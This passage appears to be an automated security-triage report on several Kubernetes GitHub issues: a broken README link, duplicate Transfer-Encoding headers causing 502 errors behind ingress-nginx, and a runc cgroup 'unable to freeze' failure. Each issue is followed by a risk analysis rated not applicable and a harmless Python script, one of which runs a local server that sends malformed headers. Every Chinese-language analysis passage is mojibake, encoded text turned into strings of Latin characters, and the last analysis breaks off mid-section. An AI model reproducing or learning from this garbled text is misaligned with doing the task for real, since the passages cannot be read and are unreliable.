$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æœ¬Issueçš„è®¨è®ºå†…å®¹æ˜¯å…³äºKubernetesä¸­ExponentialBackoffï¼ˆæŒ‡æ•°é€€é¿é‡è¯•æœºåˆ¶ï¼‰å®ç°æ–¹å¼çš„é—®é¢˜ã€‚é—®é¢˜æè¿°æ˜¯ï¼šå½“å‰å®ç°ä¸€æ—¦è¾¾åˆ°é€€é¿ä¸Šé™Capï¼ˆæ¯”å¦‚1åˆ†é’Ÿï¼‰ï¼Œå°±åœæ­¢äº†åç»­é‡è¯•ï¼Œè€ŒæœŸæœ›çš„è¡Œä¸ºæ˜¯åœ¨åˆ°è¾¾ä¸Šé™åå§‹ç»ˆä»¥è¯¥ä¸Šé™é¢‘ç‡é‡è¯•ã€‚è¿™å±äºè°ƒåº¦ã€é‡è¯•é€»è¾‘çš„åŠŸèƒ½å®ç°å»ºè®®ï¼Œä¸æ¶‰åŠä»»ä½•æ•°æ®æ³„éœ²ã€æƒé™ç»•è¿‡ã€ææƒã€ä»£ç æ‰§è¡Œã€ä¿¡æ¯æ³„éœ²ï¼Œä¹Ÿä¸å­˜åœ¨å› ä¸å½“é…ç½®å¯¼è‡´çš„æš´éœ²é£é™©æˆ–æ”»å‡»é¢å¢åŠ ã€‚æ•´ç¯‡å†…å®¹å‡æœªæ¶‰åŠä¸å®‰å…¨ç›¸å…³çš„è¯é¢˜ï¼Œä»…ä¸ºæœºåˆ¶è°ƒæ•´å’ŒåŠŸèƒ½å®ç°å»ºè®®ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æœ¬Issueæè¿°çš„é—®é¢˜ä¸å®‰å…¨æ— å…³ï¼Œå±äºåŠŸèƒ½ä¼˜åŒ–ä¸è¡Œä¸ºè®¨è®ºï¼Œå› æ­¤æ— éœ€å¤ç°å®‰å…¨é—®é¢˜è„šæœ¬ã€‚
# ä¸‹é¢ä»…å®ç°äº†ç±»ä¼¼ExponentialBackoffåˆ°ä¸Šé™åä¿æŒæœ€å¤§ç­‰å¾…çš„é€»è¾‘ä½œä¸ºåŠŸèƒ½æ¨¡æ‹Ÿï¼Œæ— å®‰å…¨å½±å“ã€‚
import time

def exponential_backoff_with_cap(duration, factor, cap, steps, max_total_wait=60):
    waits = []
    for step in range(steps):
        waits.append(duration)
        duration = min(duration * factor, cap)
        if sum(waits) > max_total_wait:
            break
    for w in waits:
        print(f"Check action, waiting {w} seconds")
        time.sleep(0.01)  # ç¼©çŸ­ç­‰å¾…ä»¥ä¾¿è„šæœ¬å¿«é€Ÿæ‰§è¡Œ
    print("Backoff complete.")

# æµ‹è¯•ä»£ç ï¼šæœŸæœ›æ­¥è¿›ä¸º1s, 2s, 4s,... è¾¾åˆ°60såä¿æŒ60s
exponential_backoff_with_cap(1, 2, 60, 10)
```


**è§£é‡Šè¯´æ˜ï¼š**

ä¸Šè¿°è„šæœ¬å®ç°äº†ä¸€ä¸ªæŒ‡æ•°é€€é¿é€»è¾‘çš„åŠŸèƒ½æ¨¡æ‹Ÿï¼šåˆå§‹ç­‰å¾…1ç§’ï¼Œç„¶åæ¯æ¬¡ç­‰å¾…æ—¶é—´ç¿»å€ï¼Œæœ€å¤šä¸è¶…è¿‡60ç§’ï¼ˆcapï¼‰ï¼Œå¹¶ä¿æŒæœ€å¤š10æ¬¡æˆ–ç´¯è®¡ç­‰å¾…è¶…è¿‡1åˆ†é’Ÿååœæ­¢ã€‚è¿™é‡Œåªæ˜¯ç”¨æ¥æ¨¡æ‹Ÿæœ¬Issueä¸­æ‰€æè¿°çš„æŒ‡æ•°é€€é¿æœºåˆ¶çš„å˜æ›´å»ºè®®ï¼Œå¹¶æœªå¤ç°ä»»ä½•å®‰å…¨é—®é¢˜ï¼Œä»…ä¾›è¡Œä¸ºéªŒè¯ã€‚

---


## Issue #131107 Click on the installation section â†’ 404 error

- Issue é“¾æ¥ï¼š[#131107](https://github.com/kubernetes/kubernetes/issues/131107)

### Issue å†…å®¹

#### What happened?

#### Bug
In the README, link to 'install.sh' is broken.

#### To Reproduce
Click on the installation section â†’ 404 error

#### Suggestion
Update the link to /scripts/install.sh

#### Environment
- Browser: Chrome
- Platform: Windows 11


#### What did you expect to happen?

#### Bug
In the README, link to 'install.sh' is broken.

#### To Reproduce
Click on the installation section â†’ 404 error

#### Suggestion
Update the link to /scripts/install.sh

#### Environment
- Browser: Chrome
- Platform: Windows 11


#### How can we reproduce it (as minimally and precisely as possible)?

#### Bug
In the README, link to 'install.sh' is broken.

#### To Reproduce
Click on the installation section â†’ 404 error

#### Suggestion
Update the link to /scripts/install.sh

#### Environment
- Browser: Chrome
- Platform: Windows 11


#### Anything else we need to know?

#### Bug
In the README, link to 'install.sh' is broken.

#### To Reproduce
Click on the installation section â†’ 404 error

#### Suggestion
Update the link to /scripts/install.sh

#### Environment
- Browser: Chrome
- Platform: Windows 11


#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°çš„é—®é¢˜æ˜¯é¡¹ç›® README æ–‡ä»¶ä¸­æŒ‡å‘ `install.sh` è„šæœ¬çš„é“¾æ¥å¤±æ•ˆï¼Œå¯¼è‡´ç”¨æˆ·ç‚¹å‡»æ—¶å‡ºç° 404 é”™è¯¯ã€‚Issue æäº¤è€…å»ºè®®å°†é“¾æ¥æ›´æ–°ä¸ºæ­£ç¡®çš„è·¯å¾„ `/scripts/install.sh`ã€‚

è¿™ä¸ªé—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ–‡æ¡£é”™è¯¯æˆ–é“¾æ¥å¤±æ•ˆçš„é—®é¢˜ï¼Œå±äºå¯ç”¨æ€§æˆ–æ–‡æ¡£ç»´æŠ¤æ–¹é¢çš„é—®é¢˜ã€‚å®ƒå¹¶æœªæ­ç¤ºè½¯ä»¶æœ¬èº«å­˜åœ¨çš„ä»»ä½•å¯ä»¥ç›´æ¥è¢«åˆ©ç”¨æ¥æ‰§è¡Œæœªæˆæƒæ“ä½œã€æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€å¯¼è‡´æ‹’ç»æœåŠ¡æˆ–æå‡æƒé™çš„ç¼ºé™·ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1.  è¯¥é—®é¢˜ä¸æ˜¯è½¯ä»¶æœ¬èº«çš„å®‰å…¨æ¼æ´ã€‚
2.  Issue æäº¤è€…æ²¡æœ‰æš´éœ²æ•æ„Ÿä¿¡æ¯æˆ–è¿›è¡Œä¸å½“æ“ä½œã€‚
3.  é—®é¢˜ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜é£é™©è¡Œä¸ºã€‚
4.  é—®é¢˜ä¸ä¼šå¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚
5.  é—®é¢˜ä¸ä¼šæ³„éœ²å‡­æ®ã€‚
6.  é—®é¢˜ä¸æ¶‰åŠå¤šç”¨æˆ·åœºæ™¯ä¸‹çš„æƒé™ç»•è¿‡æˆ–äº’ç›¸å½±å“ã€‚

å› æ­¤ï¼Œè¯¥ Issue ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥ Issue ä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œæ— éœ€æä¾›å¤ç°è„šæœ¬ã€‚
# é—®é¢˜æ˜¯æ–‡æ¡£ä¸­çš„é“¾æ¥é”™è¯¯ï¼Œå¯ä»¥é€šè¿‡æ‰‹åŠ¨æ£€æŸ¥ README æ–‡ä»¶æˆ–å°è¯•è®¿é—®é“¾æ¥æ¥å¤ç°ã€‚
print("è¯¥ Issue æŒ‡å‡ºçš„æ˜¯æ–‡æ¡£é“¾æ¥é”™è¯¯ï¼Œéå®‰å…¨é£é™©ï¼Œæ— éœ€ PoCã€‚")
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Issue æŠ¥å‘Šçš„æ˜¯æ–‡æ¡£ï¼ˆREADME æ–‡ä»¶ï¼‰ä¸­çš„ä¸€ä¸ªè¶…é“¾æ¥é”™è¯¯ï¼ŒæŒ‡å‘å®‰è£…è„šæœ¬ `install.sh` çš„é“¾æ¥å·²å¤±æ•ˆï¼Œå¯¼è‡´ç”¨æˆ·ç‚¹å‡»åæ”¶åˆ° 404 Not Found é”™è¯¯ã€‚è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„æ–‡æ¡£ç»´æŠ¤é—®é¢˜ï¼Œå½±å“äº†ç”¨æˆ·è·å–å®‰è£…è„šæœ¬çš„ä¾¿æ·æ€§ï¼Œä½†ä¸ä»£è¡¨è½¯ä»¶æœ¬èº«å­˜åœ¨å¯è¢«åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚ç”±äºå®ƒä¸æ»¡è¶³ä»»ä½•ä½é£é™©æˆ–é«˜é£é™©å®‰å…¨é—®é¢˜çš„å®šä¹‰ï¼Œå› æ­¤é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ï¼Œæ— éœ€æä¾›ç”¨äºå¤ç°å®‰å…¨æ¼æ´çš„ PoC è„šæœ¬ã€‚æä¾›çš„ Python ä»£ç ä»…è¾“å‡ºä¸€æ¡è¯´æ˜ä¿¡æ¯ã€‚

---


## Issue #131099 Transfer-Encoding: chunked" while reading response header from upstream

- Issue é“¾æ¥ï¼š[#131099](https://github.com/kubernetes/kubernetes/issues/131099)

### Issue å†…å®¹

#### What happened?

After upgrading  ngress-nginx-controller to v1.11.5 and kube webhook version v20231226-1a7112e06, getting-  upstream sent duplicate header line: "Transfer-Encoding: chunked", previous value: "Transfer-Encoding: chunked" while reading response header from upstream.

#### What did you expect to happen?

From our gui, i am trying to hit search api, but everytime i hit it i am getting upstream sent duplicate header line: "Transfer-Encoding: chunked", previous value: "Transfer-Encoding: chunked" while reading response header from upstream and 502 as response.

#### How can we reproduce it (as minimally and precisely as possible)?

I have upgraded from v1.9.4 to v.11.5 and kubehook from v20231011-8b53cabe0 to v20231226-1a7112e06, than i am getting this

#### Anything else we need to know?

I have tried to upgrade to v1.12.1 also, after that upgrade also getting same issue,

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.30.3
```

</details>


#### Cloud provider

<details>
Azure
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ªåœ¨å‡çº§ `ingress-nginx-controller` å’Œ `kube-webhook` åå‡ºç°çš„é—®é¢˜ã€‚å…·ä½“è¡¨ç°ä¸ºï¼Œå½“ç”¨æˆ·é€šè¿‡ GUI è®¿é—®æŸä¸ª Search API æ—¶ï¼Œ`ingress-nginx` è¿”å› 502 Bad Gateway é”™è¯¯ï¼Œå¹¶åœ¨æ—¥å¿—ä¸­è®°å½• "upstream sent duplicate header line: 'Transfer-Encoding: chunked', previous value: 'Transfer-Encoding: chunked' while reading response header from upstream"ã€‚

è¿™ä¸ªé”™è¯¯ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºé—®é¢˜æ¥æºäºä¸Šæ¸¸æœåŠ¡ï¼ˆupstream serviceï¼‰ï¼Œå³ Search API æ‰€åœ¨çš„åç«¯åº”ç”¨ã€‚è¯¥åº”ç”¨åœ¨å…¶ HTTP å“åº”ä¸­å‘é€äº†ä¸¤ä¸ªé‡å¤çš„ `Transfer-Encoding: chunked` å¤´éƒ¨ã€‚æ ¹æ® HTTP/1.1 è§„èŒƒ (RFC 7230, Section 3.2.2)ï¼Œå¤§å¤šæ•° Header å­—æ®µä¸å…è®¸å¤šæ¬¡å‡ºç°ï¼Œ`Transfer-Encoding` å°±æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚`ingress-nginx` ä½œä¸ºåå‘ä»£ç†ï¼Œåœ¨æ¥æ”¶åˆ°æ¥è‡ªä¸Šæ¸¸çš„ä¸ç¬¦åˆ HTTP è§„èŒƒçš„å“åº”æ—¶ï¼Œä¼šæ‹’ç»è¯¥å“åº”å¹¶å‘ä¸Šæ¸¸å®¢æˆ·ç«¯ï¼ˆå³ç”¨æˆ·çš„ GUI è¯·æ±‚ï¼‰è¿”å› 502 é”™è¯¯ã€‚

æ ¸å¿ƒé—®é¢˜åœ¨äºä¸Šæ¸¸åº”ç”¨ç¨‹åºè¿åäº† HTTP åè®®æ ‡å‡†ï¼Œå‘é€äº†é‡å¤çš„ `Transfer-Encoding` å¤´éƒ¨ã€‚`ingress-nginx-controller` åªæ˜¯å¿ å®åœ°æ£€æµ‹å¹¶æŠ¥å‘Šäº†è¿™ä¸ªæ¥è‡ªä¸Šæ¸¸çš„é—®é¢˜ï¼Œå…¶è¡Œä¸ºæ˜¯ç¬¦åˆé¢„æœŸçš„ï¼Œå› ä¸ºå®ƒéœ€è¦ç¡®ä¿ä»£ç†æµé‡çš„è§„èŒƒæ€§ã€‚

è™½ç„¶è¿™ä¸ªé—®é¢˜å¯¼è‡´äº†æœåŠ¡ä¸å¯ç”¨ï¼ˆSearch API æ— æ³•è®¿é—®ï¼‰ï¼Œè¿™å±äºä¸€ç§æ‹’ç»æœåŠ¡ï¼ˆDenial of Serviceï¼‰çš„æƒ…å†µï¼Œä½†å…¶æ ¹æºåœ¨äºä¸Šæ¸¸åº”ç”¨çš„é”™è¯¯é…ç½®æˆ– Bugï¼Œè€Œä¸æ˜¯ `ingress-nginx-controller` æœ¬èº«çš„æ¼æ´ã€‚æ”»å‡»è€…æ— æ³•åˆ©ç”¨ `ingress-nginx-controller` æ¥ç›´æ¥é€ æˆå±å®³ï¼Œä»–ä»¬æœ€å¤šåªèƒ½é€šè¿‡è§¦å‘ä¸Šæ¸¸åº”ç”¨çš„è¿™ä¸ª Bug æ¥é—´æ¥å¯¼è‡´è¯¥ç‰¹å®š API çš„ 502 é”™è¯¯ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1.  è¯¥é—®é¢˜ä¸æ˜¯ `ingress-nginx-controller` ç»„ä»¶æœ¬èº«çš„å®‰å…¨æ¼æ´ã€‚
2.  é—®é¢˜æ˜¯ç”±ä¸Šæ¸¸æœåŠ¡ï¼ˆåç«¯åº”ç”¨ï¼‰å¼•èµ·çš„åè®®è¿è§„ã€‚
3.  è™½ç„¶å¯¼è‡´äº†æœåŠ¡ä¸å¯ç”¨ (Availability Impact)ï¼Œä½†è¿™æ˜¯ä¸Šæ¸¸åº”ç”¨çš„é—®é¢˜ï¼Œ`ingress-nginx` åªæ˜¯æŠ¥å‘Šè€…ã€‚
4.  ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€ææƒã€ä¿¡æ¯æ³„éœ²ç­‰é«˜é£é™©åœºæ™¯ã€‚

å› æ­¤ï¼Œè¯¥ Issue æè¿°çš„é—®é¢˜ä¸å±äº `ingress-nginx-controller` é¡¹ç›®çš„å®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥ Issue æŒ‡å‡ºçš„é—®é¢˜æºäºä¸Šæ¸¸ (upstream) æœåŠ¡å‘é€äº†é‡å¤çš„ HTTP Headerï¼Œ
# è€Œé ingress-nginx-controller æœ¬èº«çš„æ¼æ´ã€‚
# ingress-nginx-controller åªæ˜¯æ£€æµ‹å¹¶æŠ¥å‘Šäº†ä¸Šæ¸¸æœåŠ¡çš„åè®®è¿è§„è¡Œä¸ºã€‚
# å› æ­¤ï¼Œè¯¥é—®é¢˜ä¸è¢«è¯„å®šä¸º ingress-nginx-controller çš„å®‰å…¨é£é™©ï¼Œ
# æ— éœ€æä¾›é’ˆå¯¹ ingress-nginx-controller çš„å¤ç° POC è„šæœ¬ã€‚
#
# å¦‚æœéœ€è¦æ¨¡æ‹Ÿä¸Šæ¸¸æœåŠ¡çš„é”™è¯¯è¡Œä¸ºï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªç®€å•çš„ HTTP æœåŠ¡å™¨ï¼Œ
# åœ¨å“åº”ä¸­æ•…æ„å‘é€é‡å¤çš„ "Transfer-Encoding: chunked" å¤´éƒ¨ã€‚
# ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œç”¨äºæ¼”ç¤ºä¸Šæ¸¸æœåŠ¡å¦‚ä½•å¯èƒ½è§¦å‘æ­¤é—®é¢˜ï¼Œä½†å®ƒå¹¶éé’ˆå¯¹ ingress-nginx çš„æ¼æ´åˆ©ç”¨ã€‚

import http.server
import socketserver
import threading
import time

PORT = 10080

class DuplicateHeaderHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            self.send_response(200)
            # å‘é€ç¬¬ä¸€ä¸ª Transfer-Encoding header
            self.send_header("Transfer-Encoding", "chunked")
            # æ•…æ„å‘é€ç¬¬äºŒä¸ªé‡å¤çš„ Transfer-Encoding header
            self.send_header("Transfer-Encoding", "chunked")
            self.send_header("Content-Type", "text/plain")
            self.end_headers()

            # å‘é€ chunked body (ç¤ºä¾‹)
            chunk1 = b"This is the first chunk.\r\n"
            self.wfile.write(b"%x\r\n" % len(chunk1))
            self.wfile.write(chunk1)
            self.wfile.write(b"\r\n")

            chunk2 = b"This is the second chunk.\r\n"
            self.wfile.write(b"%x\r\n" % len(chunk2))
            self.wfile.write(chunk2)
            self.wfile.write(b"\r\n")

            # å‘é€ç»“æŸ chunk
            self.wfile.write(b"0\r\n\r\n")
            print(f"Responded to GET {self.path} with duplicate Transfer-Encoding headers.")

        except Exception as e:
            print(f"Error handling request: {e}")

def run_server():
    with socketserver.TCPServer(("", PORT), DuplicateHeaderHandler) as httpd:
        print(f"Serving on port {PORT}. This server sends duplicate Transfer-Encoding headers.")
        print("Configure your Ingress to point to this service (ClusterIP or NodePort on localhost:10080).")
        print("Accessing the service via Ingress should trigger the 'duplicate header' error in ingress-nginx logs.")
        httpd.serve_forever()

# ä¸»æ‰§è¡Œé€»è¾‘
print("Starting dummy HTTP server to simulate upstream error...")
server_thread = threading.Thread(target=run_server)
server_thread.daemon = True # å…è®¸ä¸»çº¿ç¨‹é€€å‡ºæ—¶æœåŠ¡å™¨çº¿ç¨‹ä¹Ÿé€€å‡º
server_thread.start()

# è®©æœåŠ¡å™¨è¿è¡Œä¸€æ®µæ—¶é—´ (ä¾‹å¦‚ 120 ç§’) æˆ–ç›´åˆ°æ‰‹åŠ¨ä¸­æ–­
try:
    print("Server started in background thread. Running for 120 seconds.")
    print("You can now try accessing a Kubernetes Ingress resource pointing to this server.")
    time.sleep(120)
    print("Timeout reached. Stopping server simulation.")
except KeyboardInterrupt:
    print("Interrupted by user. Stopping server simulation.")

# æ³¨æ„ï¼šå®é™…åœæ­¢ TCPServer éœ€è¦æ›´å¤æ‚çš„å¤„ç†ï¼Œè¿™é‡Œä»…ç¤ºæ„æ€§åœ°é€€å‡ºä¸»çº¿ç¨‹ã€‚
# åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¯ä»¥é€šè¿‡ httpd.shutdown() åœ¨å¦ä¸€ä¸ªçº¿ç¨‹ä¸­åœæ­¢å®ƒã€‚
```


**è§£é‡Šè¯´æ˜ï¼š**

ä¸Šè¿° Python è„šæœ¬å¹¶æœªå°è¯•å¤ç° `ingress-nginx-controller` çš„å®‰å…¨æ¼æ´ï¼Œå› ä¸ºå®ƒå·²è¢«åˆ¤æ–­ä¸ºâ€œä¸æ¶‰åŠâ€å®‰å…¨é£é™©ã€‚è„šæœ¬çš„ä½œç”¨æ˜¯åˆ›å»ºä¸€ä¸ªç®€å•çš„ HTTP æœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨æ¨¡æ‹Ÿäº† Issue ä¸­æè¿°çš„ä¸Šæ¸¸ï¼ˆupstreamï¼‰æœåŠ¡çš„é”™è¯¯è¡Œä¸ºâ€”â€”å³åœ¨å…¶å“åº”ä¸­å‘é€é‡å¤çš„ `Transfer-Encoding: chunked` HTTP å¤´éƒ¨ã€‚

1.  **æœåŠ¡å™¨è®¾ç½®**ï¼šè„šæœ¬ä½¿ç”¨ Python å†…ç½®çš„ `http.server` å’Œ `socketserver` æ¨¡å—åœ¨æœ¬åœ° `10080` ç«¯å£å¯åŠ¨ä¸€ä¸ª TCP æœåŠ¡å™¨ã€‚
2.  **è¯·æ±‚å¤„ç†**ï¼š`DuplicateHeaderHandler` ç±»å¤„ç†è¿›å…¥çš„ GET è¯·æ±‚ã€‚
3.  **æ¨¡æ‹Ÿé”™è¯¯**ï¼šåœ¨ `do_GET` æ–¹æ³•ä¸­ï¼ŒæœåŠ¡å™¨æ„å»ºä¸€ä¸ª HTTP 200 å“åº”ã€‚å…³é”®åœ¨äºå®ƒè°ƒç”¨äº† `self.send_header("Transfer-Encoding", "chunked")` ä¸¤æ¬¡ï¼Œæ•…æ„åˆ¶é€ äº†é‡å¤çš„å¤´éƒ¨ã€‚
4.  **Chunked å“åº”ä½“**ï¼šä¸ºäº†ä½¿ `Transfer-Encoding: chunked` åˆæ³•ï¼ˆé™¤äº†é‡å¤ä¹‹å¤–ï¼‰ï¼Œè„šæœ¬è¿˜å‘é€äº†ä¸€ä¸ªç®€å•çš„åˆ†å—ç¼–ç çš„å“åº”ä½“ã€‚
5.  **è¿è¡Œä¸æµ‹è¯•**ï¼šè„šæœ¬åœ¨åå°çº¿ç¨‹ä¸­è¿è¡ŒæœåŠ¡å™¨ï¼Œå¹¶ä¿æŒä¸»çº¿ç¨‹æ´»åŠ¨ 120 ç§’ã€‚è¦è§‚å¯Ÿ Issue ä¸­æè¿°çš„ç°è±¡ï¼Œéœ€è¦å°† Kubernetes é›†ç¾¤ä¸­çš„ä¸€ä¸ª Ingress èµ„æºé…ç½®ä¸ºå°†æµé‡è½¬å‘åˆ°è¿è¡Œæ­¤è„šæœ¬çš„ Pod æˆ–èŠ‚ç‚¹ä¸Šçš„ `10080` ç«¯å£ã€‚ç„¶åï¼Œé€šè¿‡è¯¥ Ingress è®¿é—®æœåŠ¡ã€‚æ­¤æ—¶ï¼Œåº”è¯¥èƒ½åœ¨ `ingress-nginx-controller` çš„æ—¥å¿—ä¸­çœ‹åˆ°ä¸ Issue ä¸­æè¿°ç±»ä¼¼çš„ "upstream sent duplicate header line" é”™è¯¯ï¼Œå¹¶ä¸”å®¢æˆ·ç«¯ä¼šæ”¶åˆ° 502 å“åº”ã€‚

è¿™ä¸ªè„šæœ¬ä»…ç”¨äºæ¼”ç¤ºå¯¼è‡´é—®é¢˜çš„ä¸Šæ¸¸æœåŠ¡è¡Œä¸ºï¼Œå¸®åŠ©ç†è§£ Issue çš„æ ¹æºï¼Œè€Œä¸æ˜¯åˆ©ç”¨ `ingress-nginx-controller` çš„ä»»ä½•å®‰å…¨å¼±ç‚¹ã€‚

---


## Issue #131087 error setting cgroup config for procHooks process: unable to freeze

- Issue é“¾æ¥ï¼š[#131087](https://github.com/kubernetes/kubernetes/issues/131087)

### Issue å†…å®¹

#### What happened?

This is likely the wrong place, but I want to throw the hat in the ring and say that this is an issue beyond fixing the flakey test. Instead of duplicating the issue, I though it would be best to comment here instead.



We just saw the same error in a production cluster for a job which failed to run. It has run 20k+ times before.

```
level=error msg="StartContainer for \"xxxx\" failed" error="rpc error: code = Unknown desc = failed to create containerd task: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container process: error during container init: error setting cgroup config for procHooks process: unable to freeze"
```

```
  Warning  Failed     29m   kubelet            Error: failed to create containerd task: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container
 process: error during container init: error setting cgroup config for procHooks process: unable to freeze: unknown
```
Currently running on EKS:

- ami: ami-00ab73ce8dbebbdad
- machine: t3.xlarge
- k8s revision: v1.31.6-eks-bc803b4
- containerd version: 1.7.25
- OS: Amazon Linux 2, amd64
- Kernel version: 5.10.234-225.910.amzn2.x86_64

Node stats at the time:
- no resource requests on the pod (resources: {})
- usual consumption for job is ~3m cpu, 5Mi ram
- 9 other running pods on the node when job scheduled
- 1700m available vcpu, 3000Mi ram on the node
- no other known node alerts or cluster events
- no other pods affected on the node

Potentially related to https://github.com/kubernetes/kubernetes/issues/131043#issuecomment-2756029320

#### What did you expect to happen?

The container not to crash

#### How can we reproduce it (as minimally and precisely as possible)?

Have not been able to reproduce. Suspecting its related to the lack of pod requests, given that https://github.com/kubernetes/kubernetes/issues/131043#issuecomment-2756029320 fails due to minimal runtime footprint

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
- k8s revision: v1.31.6-eks-bc803b4

</details>


#### Cloud provider

<details>
AWS EKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here
Linux ip-XXX.us-west-2.compute.internal 5.10.234-225.910.amzn2.x86_64 #1 SMP Fri Feb 14 16:52:40 UTC 2025 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
- containerd version: 1.7.25
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **é—®é¢˜æè¿°åˆ†æ**: è¯¥ Issue æè¿°äº†ä¸€ä¸ªåœ¨ Kubernetes (EKS) ç¯å¢ƒä¸­å¯åŠ¨å®¹å™¨æ—¶é‡åˆ°çš„é”™è¯¯ã€‚é”™è¯¯ä¿¡æ¯ `error setting cgroup config for procHooks process: unable to freeze` æŒ‡å‘äº†åœ¨å®¹å™¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­ï¼Œ`runc` å°è¯•ä¸º `procHooks` é…ç½® cgroup æ—¶å¤±è´¥ï¼Œå…·ä½“æ˜¯æ— æ³• "freeze" è¿›ç¨‹ã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨å®¹å™¨è¿è¡Œæ—¶ï¼ˆå¦‚ runcï¼‰ä¸ Linux å†…æ ¸çš„ cgroup å­ç³»ç»Ÿäº¤äº’æ—¶å‡ºç°é—®é¢˜ï¼Œå¯èƒ½æ˜¯ç”±äºå†…æ ¸ bugã€cgroup é…ç½®å†²çªã€èµ„æºç«äº‰æˆ–ç‰¹å®šæ—¶åºä¸‹çš„ race conditionã€‚
2.  **ä¸Šä¸‹æ–‡ä¿¡æ¯**:
    *   é—®é¢˜å‘ç”Ÿåœ¨ç”Ÿäº§ç¯å¢ƒçš„ EKS é›†ç¾¤ä¸Šï¼Œä½¿ç”¨çš„ Kubernetesã€containerdã€OS (Amazon Linux 2) å’Œå†…æ ¸ç‰ˆæœ¬éƒ½å·²æä¾›ã€‚
    *   å‡ºé”™çš„ Pod æ²¡æœ‰è®¾ç½®èµ„æºè¯·æ±‚å’Œé™åˆ¶ (`resources: {}`)ã€‚
    *   èŠ‚ç‚¹å½“æ—¶èµ„æºå……è¶³ï¼ˆ1700m vCPU, 3000Mi RAM å¯ç”¨ï¼‰ã€‚
    *   è¯¥ Job ä¹‹å‰å·²æˆåŠŸè¿è¡Œ 2 ä¸‡å¤šæ¬¡ï¼Œè¡¨æ˜é—®é¢˜æ˜¯é—´æ­‡æ€§çš„ï¼Œéš¾ä»¥ç¨³å®šå¤ç°ã€‚
    *   ç”¨æˆ·æ€€ç–‘é—®é¢˜ä¸ Pod æœªè®¾ç½®èµ„æºè¯·æ±‚æœ‰å…³ï¼Œå¹¶å…³è”äº†å¦ä¸€ä¸ª Kubernetes Issueã€‚
3.  **å®‰å…¨é£é™©è¯„ä¼°**:
